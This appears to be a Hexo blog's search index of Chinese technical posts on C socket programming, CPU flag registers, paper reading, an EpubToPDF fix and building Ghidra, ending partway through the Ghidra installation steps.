<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>16位CPU标志寄存器</title>
    <url>/2021/11/28/16%E4%BD%8DCPU%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    <content><![CDATA[<h3 id="FLAG寄存器各个标志位"><a href="#FLAG寄存器各个标志位" class="headerlink" title="FLAG寄存器各个标志位"></a>FLAG寄存器各个标志位</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122321209.svg" alt="16位CPU标志寄存器"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122320319.png" alt="image-20220711220615009"></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
  </entry>
  <entry>
    <title>C socket网络通信</title>
    <url>/2023/07/05/C-socket%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<p>在C语言Socket通信中，客户端和服务器端的流程如下：</p>
<p><strong>服务器端流程</strong>：</p>
<ol>
<li>创建服务器套接字（socket）：使用<code>socket()</code>函数创建一个套接字，指定地址族（例如，<code>AF_INET</code>表示IPv4）和套接字类型（例如，<code>SOCK_STREAM</code>表示TCP套接字）。</li>
<li>绑定套接字到指定地址和端口（bind）：使用<code>bind()</code>函数将套接字绑定到服务器的IP地址和监听端口上。</li>
<li>监听连接请求（listen）：使用<code>listen()</code>函数监听指定端口上的连接请求。可以指定一个等待队列的最大长度。</li>
<li>接受连接请求（accept）：使用<code>accept()</code>函数接受来自客户端的连接请求。它会阻塞程序，直到有客户端连接请求到达。返回一个新的套接字，用于与客户端进行通信。</li>
<li>与客户端通信：使用新的套接字进行与客户端的通信。可以使用<code>read()</code>和<code>write()</code>函数从客户端接收数据和发送数据。</li>
<li>关闭套接字（close）：通信结束后，使用<code>close()</code>函数关闭套接字。</li>
</ol>
<p><strong>客户端流程</strong>：</p>
<ol>
<li>创建客户端套接字（socket）：使用<code>socket()</code>函数创建一个套接字，指定地址族和套接字类型。</li>
<li>设置服务器地址和端口：使用<code>struct sockaddr_in</code>结构设置服务器的IP地址和端口号。</li>
<li>连接服务器（connect）：使用<code>connect()</code>函数连接到服务器。传入服务器的地址和端口号。</li>
<li>与服务器通信：使用已连接的套接字进行与服务器的通信。可以使用<code>read()</code>和<code>write()</code>函数从服务器接收数据和发送数据。</li>
<li>关闭套接字（close）：通信结束后，使用<code>close()</code>函数关闭套接字。</li>
</ol>
<p>这些是基本的流程，你可以根据具体需求在通信过程中进行数据的读取和写入。记得在错误处理方面进行适当的处理，例如检查函数返回值是否为负数来判断是否出现错误，并采取相应的措施。</p>
<span id="more"></span>

<p><strong>示例：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* server.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> server_fd, new_socket, valread;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(address);</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器信息</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定套接字到指定端口</span></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听连接</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接受新的连接请求</span></span><br><span class="line">    <span class="keyword">if</span> ((new_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, (<span class="type">socklen_t</span> *)&amp;addrlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;accept failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从客户端接收数据</span></span><br><span class="line">    valread = read(new_socket, buffer, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received message from client: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向客户端发送响应</span></span><br><span class="line">    send(new_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent to client\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    close(new_socket);</span><br><span class="line">    close(server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* client.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock = <span class="number">0</span>, valread;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    <span class="keyword">if</span> ((sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket creation failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器信息</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IPv4地址从点分十进制转换为二进制</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;invalid address / address not supported&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connection failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向服务器发送数据</span></span><br><span class="line">    <span class="keyword">if</span> (send(sock, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;send failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从服务器接收响应</span></span><br><span class="line">    <span class="keyword">if</span> ((valread = read(sock, buffer, BUFFER_SIZE)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received message from server: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    close(sock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当前给出的客户端和服务器端示例是基于TCP的简单通信模型。</p>
<p><strong>服务器端功能</strong>：</p>
<ol>
<li>创建一个服务器套接字，绑定到指定的IP地址和端口上。</li>
<li>监听来自客户端的连接请求。</li>
<li>当有连接请求到达时，接受连接并创建一个新的套接字，用于与客户端进行通信。</li>
<li>从客户端接收数据，并打印接收到的消息。</li>
<li>向客户端发送响应消息。</li>
<li>关闭与客户端的连接和套接字。</li>
<li>关闭服务器套接字。</li>
</ol>
<p><strong>客户端功能</strong>：</p>
<ol>
<li>创建一个客户端套接字。</li>
<li>设置服务器的IP地址和端口号。</li>
<li>连接到服务器。</li>
<li>向服务器发送消息。</li>
<li>从服务器接收响应消息，并打印接收到的消息。</li>
<li>关闭客户端套接字。</li>
</ol>
<p>这两个示例展示了一个简单的客户端与服务器之间的通信过程。服务器监听客户端的连接请求，接受连接并与客户端进行通信。客户端与服务器建立连接后，发送消息给服务器并等待服务器的响应。</p>
<p>这只是一个基本的示例，你可以根据需要扩展它们来实现更复杂的功能，例如处理并发连接、实现多线程服务器、处理错误情况等。</p>
<h3 id="struct-sockaddr-in结构体"><a href="#struct-sockaddr-in结构体" class="headerlink" title="struct sockaddr_in结构体"></a>struct sockaddr_in结构体</h3><p><code>struct sockaddr_in</code>是用于IPv4网络编程的C语言结构体，位于<code>&lt;netinet/in.h&gt;</code>头文件中。它用于存储IP地址和端口号信息。</p>
<p>下面是<code>struct sockaddr_in</code>结构体的定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sockaddr_in &#123;</span><br><span class="line">    short int sin_family;              // 地址家族，一般为AF_INET</span><br><span class="line">    unsigned short int sin_port;       // 16位端口号</span><br><span class="line">    struct in_addr sin_addr;           // 32位IP地址</span><br><span class="line">    unsigned char sin_zero[8];         // 填充，通常为0</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该结构体的各个成员的含义如下：</p>
<ul>
<li><code>sin_family</code>：地址家族，一般为<code>AF_INET</code>，表示使用IPv4地址。</li>
<li><code>sin_port</code>：16位端口号，用于标识应用程序中的网络服务。通过网络传输数据时，需要知道发送和接收数据的端口号。</li>
<li><code>sin_addr</code>：<code>struct in_addr</code>类型的结构体成员，用于存储32位的IPv4地址。<code>struct in_addr</code>结构体定义在<code>&lt;netinet/in.h&gt;</code>头文件中，它的成员<code>in_addr_t</code>用于表示IPv4地址。</li>
<li><code>sin_zero</code>：长度为8字节的填充字段，用于补齐结构体的大小。通常将其设置为0。</li>
</ul>
<p>通过使用<code>struct sockaddr_in</code>结构体，可以方便地存储和操作IPv4地址和端口号信息。在进行网络编程时，常用的函数如<code>socket()</code>、<code>bind()</code>和<code>connect()</code>等，通常需要使用<code>struct sockaddr_in</code>结构体来表示网络地址信息。</p>
<h3 id="setsockopt-函数"><a href="#setsockopt-函数" class="headerlink" title="setsockopt()函数"></a>setsockopt()函数</h3><p><code>setsockopt()</code> 函数用于设置套接字选项，可以用来配置套接字的各种属性和行为。它位于 <code>&lt;sys/socket.h&gt;</code> 头文件中，并具有以下原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setsockopt</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">const</span> <span class="type">void</span> *optval, <span class="type">socklen_t</span> optlen)</span>;</span><br></pre></td></tr></table></figure>

<p>下面是对<code>setsockopt()</code>函数中各个参数的详细解释：</p>
<ul>
<li><p><code>sockfd</code>：套接字描述符，表示要设置选项的套接字。</p>
</li>
<li><pre><code>level
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ：选项所属的协议层或套接字类型。常见的取值有：</span><br><span class="line"></span><br><span class="line">  - `SOL_SOCKET`：通用套接字选项，适用于大多数套接字。</span><br><span class="line">  - `IPPROTO_TCP`：TCP协议相关选项。</span><br><span class="line">  - `IPPROTO_IP`：IP协议相关选项。</span><br><span class="line">  - 其他协议层或套接字类型的特定选项。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  optname</span><br></pre></td></tr></table></figure>

：选项的名称，表示要设置的具体选项。取值可以是协议层或套接字类型定义的常量，如：

- `SO_REUSEADDR`：允许地址重用。
- `SO_KEEPALIVE`：启用保活机制。
- `TCP_NODELAY`：禁用 Nagle 算法。
- 其他协议层或套接字类型定义的选项名称。
</code></pre>
</li>
<li><p><code>optval</code>：指向存储选项值的缓冲区的指针。</p>
</li>
<li><p><code>optlen</code>：指定 <code>optval</code> 缓冲区的大小。</p>
</li>
</ul>
<p><code>setsockopt()</code> 函数允许通过修改选项值来改变套接字的行为或属性。不同的选项具有不同的作用和取值范围，具体取值和含义请参考相关的文档和协议规范。</p>
<p>使用 <code>setsockopt()</code> 函数时，需要注意以下几点：</p>
<ul>
<li>返回值：函数返回0表示设置选项成功，返回-1表示失败，错误信息可以通过 <code>errno</code> 变量获取。</li>
<li>套接字选项的设置和获取通常是在套接字创建后、绑定前或连接前进行。</li>
<li>操作系统和协议的支持：不同的操作系统和网络协议可能对选项的支持和行为有所不同，请查阅相关文档以确保在特定环境中正确使用选项。</li>
</ul>
<p>在网络编程中，使用 <code>setsockopt()</code> 函数可以根据需要配置套接字的属性，以满足特定的通信需求。</p>
<h3 id="网络命名空间"><a href="#网络命名空间" class="headerlink" title="网络命名空间"></a>网络命名空间</h3><p>网络命名空间（Network Namespace）是 Linux 内核提供的一种虚拟化技术，用于将网络资源隔离开来，使得每个网络命名空间具有独立的网络堆栈、接口、路由表和防火墙规则。</p>
<p>在 Linux 中，每个进程默认都会被放置在一个称为「默认网络命名空间」的命名空间中。这意味着它们共享同一个网络堆栈和网络配置。而通过创建额外的网络命名空间，可以实现对网络资源的隔离和划分。</p>
<p>名称空间的名称是用来标识和区分不同的网络命名空间的字符串，它在创建命名空间时被指定。可以使用工具如 <code>ip netns</code> 或编程接口如 <code>setns()</code> 来管理和操作网络命名空间。网络命名空间的名称通常与需要隔离的特定网络环境或应用场景相关，以方便识别和管理多个不同的网络命名空间。</p>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
  </entry>
  <entry>
    <title>Datacon简记</title>
    <url>/2023/11/22/Datacon%E7%AE%80%E8%AE%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>HowtoReadPaper</title>
    <url>/2023/05/10/HowtoReadPaper/</url>
    <content><![CDATA[<h1 id="How-to-Read-a-Paper"><a href="#How-to-Read-a-Paper" class="headerlink" title="How to Read a Paper"></a>How to Read a Paper</h1><h2 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h2><p>研究人员花费大量时间阅读研究论文。然而，这项技能很少被教授，导致了许多不必要的努力。本文概述了一种实用且高效的三遍阅读研究论文的方法。同时，我还描述了如何使用这种方法进行文献调查</p>
<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>研究人员必须阅读论文的几个原因：为了为会议或课程审查论文，为了保持对其领域的了解，或者为了对新领域进行文献调查。一个研究人员可能每年会花费数百小时来阅读论文。</p>
<p>高效阅读论文是一项至关重要但很少被教授的技能。因此，初入研究生阶段的学生必须自行通过试错来学习。这个过程中，学生会浪费很多精力，而且经常会感到沮丧。</p>
<p>多年来，我一直使用一种简单的方法来高效阅读论文。本文介绍了“三遍阅读”的方法及其在进行文献调查中的应用。</p>
<span id="more"></span>

<h2 id="2-三遍阅读法"><a href="#2-三遍阅读法" class="headerlink" title="2. 三遍阅读法"></a>2. 三遍阅读法</h2><p>关键的思想是你应该将阅读过程分为最多三个阶段，而不是从开头一直读到结尾。每一遍阅读都达到特定的目标，并建立在上一遍阅读的基础之上：第一遍阅读让你对论文有一个整体的了解；第二遍让你掌握论文的内容，但不包括细节；第三遍则帮助你深入理解论文。</p>
<h3 id="2-1-第一遍阅读"><a href="#2-1-第一遍阅读" class="headerlink" title="2.1 第一遍阅读"></a>2.1 第一遍阅读</h3><p>第一遍阅读是快速浏览，以获得对论文的整体印象。你可以决定是否需要进行更多的阅读。这一遍应该花费约五到十分钟，包括以下步骤：</p>
<ol>
<li>仔细阅读标题（title）、摘要（abstract）和引言（introduction）</li>
<li>阅读各个章节和小节的标题，但忽略其他内容</li>
<li>阅读结论（conclusions）</li>
<li>浏览参考文献，心里勾勒出已经阅读过的文献</li>
</ol>
<p>在第一遍阅读结束时，你应该能回答以下这五个问题：</p>
<ol>
<li>类别：这是什么类型的论文？是一篇测量论文吗？是现有系统的分析吗？还是一篇研究原型的描述？</li>
<li>上下文：它与哪些其他论文相关？使用了哪些理论基础来分析问题？</li>
<li>正确性：假设是否看起来是有效的？</li>
<li>贡献：论文的主要贡献是什么？</li>
<li>清晰度：论文写得清晰吗？</li>
</ol>
<p>利用这些信息，你可以选择不再继续阅读。这可能是因为论文不引起你的兴趣，或者你对这个领域还不够了解以至于无法理解这篇论文，或者作者做出了无效的假设。第一遍阅读足以满足那些不属于你研究领域的论文，但可能在将来证明其相关性。</p>
<p>顺便提一句，当你写论文时，你可以预期大多数审稿人（和读者）只会阅读一遍。请注意选择连贯的章节和子章节标题，并编写简洁全面的摘要。如果审稿人一遍过后不能理解论文的要旨，那么论文很可能会被拒绝；如果读者在五分钟内无法理解论文的亮点，那么论文很可能永远不会被阅读。</p>
<h3 id="2-2-第二遍阅读"><a href="#2-2-第二遍阅读" class="headerlink" title="2.2 第二遍阅读"></a>2.2 第二遍阅读</h3><p>在第二遍阅读时，要更加仔细地阅读论文，但忽略证明等细节。在阅读时记录下关键点，或在旁边的空白处做出评论会有所帮助。</p>
<ol>
<li>仔细查看论文中的图表、图示和其他插图。特别关注图表，例如，坐标轴是否标记正确？结果是否显示有误差线，以确保结论具有统计学意义？常见的错误会将匆忙、粗糙的工作与真正优秀的工作区分开来。</li>
<li>记得标记相关未读参考文献以供进一步阅读（这是了解文章背景的好方法）。</li>
</ol>
<p>第二遍阅读应该花费一小时左右。在此之后，您应该能够把握论文的内容，并能向他人简要概述主要观点和支撑证据。这种程度的详细信息适用于您感兴趣但不在研究专业领域内的论文。</p>
<p> 有时你在第二遍阅读之后仍然无法理解一篇论文。这可能是因为这个主题对你来说是新的，术语和首字母缩略词不熟悉。或者作者可能使用了一种你不理解的证明或实验技术，使得论文的大部分内容无法理解。论文可能写得很差，有未经证实的主张和许多前向引用。或者可能只是因为到了晚上，你已经很累了。现在，你可以选择：（a）将这篇论文放在一边，希望你不需要理解这个材料才能在你的职业生涯中获得成功，（b）稍后回到这篇论文，也许在阅读背景材料之后，或者（c）坚持并继续进行第三遍阅读。</p>
<h3 id="2-3-第三遍阅读"><a href="#2-3-第三遍阅读" class="headerlink" title="2.3 第三遍阅读"></a>2.3 第三遍阅读</h3><p>要充分理解一篇论文，特别是如果你是审稿人，需要进行第三遍阅读。第三遍的关键是尝试虚拟地重新实现这篇论文：也就是说，做出与作者相同的假设，复现这项工作。通过将这个复现的过程与实际论文进行比较，你不仅可以轻松地识别出一篇论文的创新之处，还可以发现其潜在的缺陷和假设。</p>
<p>进行第三遍阅读需要高度专注于细节。您应该识别并质疑每个陈述中的每个假设。此外，您应该考虑如何自己呈现特定的想法。将实际情况与虚拟情况进行比较可以深入了解论文中的证明和演示技巧，而且您很可能会将其添加到自己的工具库中。在此过程中，您还应该记录未来工作的想法。</p>
<p>对于初学者而言，第三遍阅读可能需要四到五个小时，而对于有经验的读者而言则可能只需要一个小时左右。在这个阅读过程结束时，您应该能够从记忆中重构整篇论文的结构，并能够识别它的优点和缺点。特别是，您应该能够指出隐含的假设、相关工作的缺失引用以及实验或分析技术可能存在的问题。</p>
<h2 id="3-进行文献调查"><a href="#3-进行文献调查" class="headerlink" title="3. 进行文献调查"></a>3. 进行文献调查</h2><p>在进行文献调研时，需要运用论文阅读技巧。这可能需要您阅读数十篇论文，可能是在一个您不熟悉的领域。那么，您应该阅读哪些论文呢？以下是如何使用三遍阅读方法来帮助您进行文献调研的方法。</p>
<p>首先，使用学术搜索引擎，如Google Scholar或CiteSeer，以及一些精心选择的关键词在该领域中找到三到五篇最近的论文。对于每篇论文，进行第一遍阅读，了解其工作内容，然后阅读它们的相关工作部分。您将找到最近工作的概述，也许，如果您很幸运的话，还会找到最近综述论文的引用。如果您能找到这样的综述论文，那就完成了。然后，阅读这篇综述论文，为自己的好运感到庆幸。</p>
<p>如果没有找到综述论文，那么在第二步中，可以在参考文献中查找重复的引用和作者姓名。这些是该领域的关键论文和研究人员。下载这些关键论文并将它们放在一边。然后，访问这些关键研究人员的网站，看看他们最近发表了哪些论文。这将帮助您确定该领域的顶级会议，因为最好的研究人员通常会在顶级会议上发表论文。</p>
<p>第三步是访问这些顶级会议的网站，并查看它们最近的论文集。快速浏览通常可以确定最近的高质量相关工作。这些论文以及您之前收集的论文构成了您的文献综述的第一个版本。通过这些论文进行两次阅读。如果它们都引用了您之前没有找到的关键论文，获取并阅读它，必要时请反复阅读。</p>
<h2 id="4-经验"><a href="#4-经验" class="headerlink" title="4. 经验"></a>4. 经验</h2><p>我过去15年一直使用这种方法来阅读会议论文、撰写评论、进行背景研究，以及在讨论前快速审阅论文。这种有纪律的方法让我在获得整体视图之前避免淹没在细节中。它使我能够估计审阅一组论文所需的时间。此外，我可以根据自己的需求和时间来调整对论文的评估深度。</p>
<h2 id="5-相关工作"><a href="#5-相关工作" class="headerlink" title="5. 相关工作"></a>5. 相关工作</h2><p>如果您正在阅读一篇论文以进行审稿，则还应该阅读Timothy Roscoe的论文《Writing reviews for systems conferences》[2]。如果您计划撰写技术论文，则应参考Henning Schulzrinne全面的网站[3]和George Whitesides关于该过程的出色概述[4]。最后，Simon Peyton Jones的网站涵盖了整个研究技能的范围[1]。</p>
<p><strong>论文链接：</strong><a href="https://web.stanford.edu/class/ee384m/Handouts/HowtoReadPaper.pdf">https://web.stanford.edu/class/ee384m/Handouts/HowtoReadPaper.pdf</a></p>
]]></content>
      <categories>
        <category>论文阅读</category>
      </categories>
  </entry>
  <entry>
    <title>EpubToPDF项目复现记录</title>
    <url>/2022/06/25/EpubToPDF%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><strong>项目地址：</strong><a href="https://github.com/HAKSOAT/EpubToPdf">https://github.com/HAKSOAT/EpubToPdf</a></p>
<p><strong>报错记录：</strong>按照readme中安装好依赖库后，运行后报错。</p>
<p>错误1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;gbk&#x27; codec can&#x27;t decode byte 0xa2 in position 153: illegal multibyte sequence</span><br></pre></td></tr></table></figure>

<p>“GBK”，一眼编码问题，根据报错提示找到代码中<code>open()</code>函数的位置，设置encoding参数即可。</p>
<p>修改完后重新运行代码，报错。</p>
<p>错误2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No wkhtmltopdf executable found: &quot;b&#x27;&#x27;&quot;</span><br><span class="line">If this file exists please check that this process can read it. Otherwise please install wkhtmltopdf - https://github.com/JazzCore/python-pdfkit/wiki/Installing-wkhtmltopdf</span><br></pre></td></tr></table></figure>

<p>原因是未找到wkhtmltopdf这个程序，从<a href="https://wkhtmltopdf.org/downloads.html">官网下载</a>安装，配置环境变量，重新运行，仍然报错，从网上查下解决办法，手动在代码中添加安装路径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path_wk = <span class="string">r&#x27;F:\Application Installation Files\wkhtmltopdf\bin\wkhtmltopdf.exe&#x27;</span> <span class="comment">#安装位置</span></span><br><span class="line">	config = pdfkit.configuration(wkhtmltopdf = path_wk)</span><br></pre></td></tr></table></figure>

<p>在pdfpy.py文件的PdfEngine类中首行添加，因为main.py只import了这一个类，在类外边会无效。</p>
<p>修改完后，重新运行代码，成功运行，如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(gxb) F:\Project Files\EpubToPdf-master&gt;python main.py x86汇编语言_从实模式到保护模式.epub</span><br><span class="line">--- Sections converted to pdf</span><br><span class="line">--- Epub to PDF conversion started</span><br><span class="line">--- Sections combined together <span class="keyword">in</span> a single pdf file</span><br><span class="line">--- Individual pdf files deleted from directory</span><br><span class="line">--- Epub to PDF conversion successful</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>项目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux和命令提示符</title>
    <url>/2022/09/20/Linux%E5%92%8C%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="什么是命令提示符（Commamd-Prompt）"><a href="#什么是命令提示符（Commamd-Prompt）" class="headerlink" title="什么是命令提示符（Commamd  Prompt）"></a>什么是命令提示符（Commamd  Prompt）</h1><ol>
<li>Also called Terminal or Bash and is used to execute command.</li>
<li>It is typically a black screen with white font and has a  very simple User Interface. You type in commands, and it interprets these commands and runs operations in the computer.</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux源码编译Ghidra</title>
    <url>/2023/10/10/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91Ghidra/</url>
    <content><![CDATA[<h1 id="Linux源码编译安装Ghidra"><a href="#Linux源码编译安装Ghidra" class="headerlink" title="Linux源码编译安装Ghidra"></a>Linux源码编译安装Ghidra</h1><p>Linux版本：Ubuntu 18.04 64bit</p>
<p>时间：2023-10-10</p>
<p>Ghidra版本：ghidra_10.5_dev</p>
<p>Ghidra仓库地址：<a href="https://github.com/NationalSecurityAgency/Ghidra">https://github.com/NationalSecurityAgency/Ghidra</a></p>
<span id="more"></span>

<h2 id="依赖项"><a href="#依赖项" class="headerlink" title="依赖项"></a>依赖项</h2><p>通过 Readme 中描述，我们可以看到，需要的依赖项如下：</p>
<p>To create the latest development build for your platform from this source repository:</p>
<p><a href="https://github.com/NationalSecurityAgency/Ghidra#install-build-tools">Install build tools:</a></p>
<ul>
<li><a href="https://adoptium.net/temurin/releases">JDK 17 64-bit</a></li>
<li><a href="https://gradle.org/releases/">Gradle 7.3+</a></li>
<li>make, gcc, and g++ (Linux&#x2F;macOS-only)</li>
</ul>
<p>安装步骤依次介绍：</p>
<h2 id="安装-JDK"><a href="#安装-JDK" class="headerlink" title="安装 JDK"></a>安装 JDK</h2><p>我采用的是 apt 在线安装，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openjdk-17-jdk</span><br></pre></td></tr></table></figure>

<p>安装后，通过以下命令检查是否安装成功</p>
